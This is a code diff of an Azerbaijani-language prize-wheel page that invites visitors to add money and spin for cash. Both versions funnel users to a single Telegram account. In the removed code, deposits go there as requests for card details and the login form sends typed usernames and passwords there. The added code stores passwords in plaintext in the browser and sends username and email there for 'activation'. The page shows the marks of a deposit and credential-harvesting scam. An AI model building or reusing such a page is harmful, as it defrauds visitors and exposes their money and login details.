@@ -7,11 +7,9 @@
 body { font-family: Arial; text-align: center; background:#111; color:white; }
 .container { max-width:400px; margin:auto; padding:20px; }
 input, button { margin:5px; padding:10px; width:90%; }
-.hidden { display:none; }
-#wheel { margin:20px auto; width:220px; height:220px; border-radius:50%; border:5px solid white; transition: transform 3s ease-out; position: relative; }
-#wheelCanvas { width: 100%; height: 100%; border-radius: 50%; }
-#pointer { width:0; height:0; border-left:15px solid transparent; border-right:15px solid transparent; border-bottom:30px solid white; margin:-30px auto 0 auto; }
 #topMessage { background: #222; color: #FFD700; padding: 10px; border-radius: 8px; margin-bottom: 15px; font-weight: bold; }
+button { cursor: pointer; background:#333; color:white; border:none; border-radius:5px; transition:0.3s; }
+button:hover { background:#555; }
 </style>
 </head>
 <body>
@@ -20,111 +18,43 @@ input, button { margin:5px; padding:10px; width:90%; }
 
 <div id="topMessage">🎡 Çarxı fırlatmaq üçün 1₼ əlavə et və şansını sınayaraq qazan!</div>
 
-<!-- LOGIN -->
-<div id="login">
-<h2>Giriş</h2>
-<input id="loginUser" placeholder="İstifadəçi adı">
-<input id="loginPass" type="password" placeholder="Şifrə">
-<button onclick="requestTelegram()">Daxil ol</button>
-<p>Hesabınız aktiv deyil? <button onclick="requestTelegram()">Telegram vasitəsilə aktiv edin</button></p>
-</div>
-
-<!-- PANEL -->
-<div id="panel" class="hidden">
-<h2>Panel</h2>
-<p id="balanceText">Balans: 0 ₼</p>
-
-<div id="pointer"></div>
-<div id="wheel">
-  <canvas id="wheelCanvas"></canvas>
-</div>
-<button onclick="spin()">Çarxi fırlat</button>
-
-<br><br>
-<button onclick="deposit()">Balansı artır</button>
-<button onclick="withdraw()">Çıxarış</button>
-
-<p id="msg"></p>
+<!-- Qeydiyyat -->
+<div id="register">
+<h2>Qeydiyyat</h2>
+<input id="user" placeholder="İstifadəçi adı">
+<input id="email" placeholder="Email">
+<input id="pass" type="password" placeholder="Şifrə">
+<button onclick="register()">Qeydiyyatdan keç</button>
 </div>
 
 </div>
 
 <script>
-let balance = 0;
-let deg = 0;
+// Lokal saxlama üçün istifadəçi məlumatları
+let userData = JSON.parse(localStorage.getItem("userData")) || null;
 
-// Pul və boş sektorlar
-const sectors = [
-  {text:"Bəxtini bir daha sına", color:"#777", prize:0},
-  {text:"2₼", color:"#FF5733", prize:2},
-  {text:"Bəxtini bir daha sına", color:"#888", prize:0},
-  {text:"3₼", color:"#33FF57", prize:3},
-  {text:"Bəxtini bir daha sına", color:"#999", prize:0},
-  {text:"5₼", color:"#3357FF", prize:5},
-  {text:"Bəxtini bir daha sına", color:"#AAA", prize:0},
-  {text:"7₼", color:"#FF33A6", prize:7},
-  {text:"Bəxtini bir daha sına", color:"#BBB", prize:0},
-  {text:"Bəxtini bir daha sına", color:"#CCC", prize:0}
-];
+function register(){
+  let user = document.getElementById("user").value.trim();
+  let email = document.getElementById("email").value.trim();
+  let pass = document.getElementById("pass").value.trim();
 
-// Canvas çarx
-const canvas=document.getElementById("wheelCanvas"); 
-const ctx=canvas.getContext("2d"); 
-canvas.width=canvas.height=220;
+  if(!user || !email || !pass){
+    alert("Bütün xanaları doldur!");
+    return;
+  }
 
-function drawWheel(){
-  let startAngle=0; 
-  const arc=2*Math.PI/sectors.length;
-  sectors.forEach(sec=>{
-    ctx.beginPath(); 
-    ctx.moveTo(110,110);
-    ctx.arc(110,110,110,startAngle,startAngle+arc);
-    ctx.fillStyle=sec.color; 
-    ctx.fill(); 
-    ctx.strokeStyle="#fff"; 
-    ctx.stroke();
-    // text
-    ctx.save(); 
-    ctx.translate(110,110); 
-    ctx.rotate(startAngle+arc/2);
-    ctx.textAlign="right"; 
-    ctx.fillStyle="#fff"; 
-    ctx.font="bold 14px Arial"; 
-    ctx.fillText(sec.text,100,5); 
-    ctx.restore();
-    startAngle+=arc;
-  });
-}
-drawWheel();
+  // Məlumatları saxla
+  userData = {user, email, pass};
+  localStorage.setItem("userData", JSON.stringify(userData));
 
-function spin(){
-  if(balance<=0){ document.getElementById("msg").innerText="Balansınızı artırın!"; return; }
-  const sectorIndex=Math.floor(Math.random()*sectors.length);
-  const arc=360/sectors.length;
-  const randomOffset=Math.random()*arc;
-  deg+=360*5+sectorIndex*arc+randomOffset;
-  document.getElementById("wheel").style.transform="rotate("+deg+"deg)";
-  setTimeout(()=>{
-    const win=sectors[sectorIndex].prize;
-    if(win>0){ balance+=win; document.getElementById("msg").innerText="Qazandınız: "+win+" ₼"; }
-    else{ document.getElementById("msg").innerText="Bəxtini bir daha sına!"; }
-    updateBalance();
-  },3000);
-}
+  // Qeydiyyat tamamlandı, panel açılmır
+  alert("Qeydiyyat tamamlandı! Sayta birbaşa daxil olmaq mümkün deyil.");
 
-function updateBalance(){ document.getElementById("balanceText").innerText="Balans: "+balance+" ₼"; }
+  // Telegram linki ilə avtomatik mesaj hazırla və yeni pəncərədə aç
+  let message = `Salam! Mən hesabımı aktiv etmək istəyirəm.\nİstifadəçi adı: ${user}\nEmail: ${email}`;
+  let telegramLink = "https://t.me/carxfirla?text=" + encodeURIComponent(message);
 
-function deposit(){ window.open("https://t.me/carxfirla?text=Salam%20Men%20balans%20artirmaq%20isdeyirem%20zehmet%20olmasa%20kart%20gonderin"); }
-function withdraw(){ if(balance<50){ alert("Minimum 50₼ lazımdır!"); return; } window.open("https://t.me/carxfirla?text=Salam%20Men%20cixaris%20etmek%20isdeyirem%20balansim%2050₼%20olubdur"); }
-
-// Telegram mesajı üçün düymə
-function requestTelegram(){
-  alert("Sayta daxil olmaq üçün hesabınızı Telegram vasitəsilə aktiv edin.");
-  const loginUser=document.getElementById("loginUser").value.trim();
-  const loginPass=document.getElementById("loginPass").value.trim();
-  let message = `Salam! Mən hesabımı aktiv etmək istəyirəm.\nİstifadəçi adı: ${loginUser}\nŞifrə: ${loginPass}`;
-  // Telegram linki ilə avtomatik mesaj
-  window.open("https://t.me/carxfirla?text=" + encodeURIComponent(message));
+  window.open(telegramLink, "_blank");
 }
 </script>
 
